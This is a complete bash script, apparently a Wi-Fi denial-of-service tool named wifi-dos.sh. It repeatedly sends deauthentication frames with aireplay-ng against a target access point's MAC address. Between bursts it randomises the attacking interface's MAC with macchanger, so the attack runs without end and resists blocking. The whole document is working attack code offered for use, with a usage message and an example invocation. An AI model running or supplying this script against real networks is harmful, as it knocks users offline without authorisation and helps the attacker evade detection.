#!/bin/bash

if [ "$1" == ""] || [ "$2" == ""]
then
	echo "Usage: ./wifi-dos.sh [Interface] [Target]"
	echo "Example: ./wifi-dos.sh wlan0mon AA:BB:CC:DD:EE:FF"
else
	while true
	do
		aireplay-ng --deauth 2 -a $2 $1 | grep "DeAuth"
		ip link set $1 down
		macchanger -r $1 | grep "New Mac"
		ip link set $1 up
		sleep 5
	done
fi
